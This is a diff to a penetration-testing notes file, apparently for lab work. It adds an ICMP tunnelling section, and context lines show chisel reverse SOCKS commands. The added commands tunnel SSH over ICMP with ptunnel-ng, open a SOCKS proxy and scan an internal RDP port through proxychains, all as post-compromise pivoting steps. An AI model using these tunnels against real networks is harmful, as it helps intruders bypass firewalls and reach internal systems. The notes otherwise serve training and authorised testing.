@@ -1,4 +1,4 @@
-
+x 
 ## Persistence
 *Probably already with a meterpreter shell*
 
@@ -275,3 +275,36 @@ sudo ./chisel server --reverse -v -p 1234 --socks5
 ```
 ./chisel client -v 10.10.14.17:1234 R:socks
 ```
+**ICMP SOCKS Tunneling**
+*Only works if ICMP/pings are allowed*
+
+Install ptunnel-ng
+```
+git clone https://github.com/utoni/ptunnel-ng.git
+sudo ./autogen.sh 
+```
+Transfer 
+```
+scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+```
+Server
+```
+sudo ./ptunnel-ng -r10.129.202.64 -R22
+```
+Client
+```
+sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+```
+Start SSH session through the tunnel
+```
+ssh -p2222 -lubuntu 127.0.0.1
+```
+Dynamic Port forward through SSH
+```
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+```
+Proxychain through the tunnel
+```
+proxychains nmap -sV -sT 172.16.5.19 -p3389
+```
+
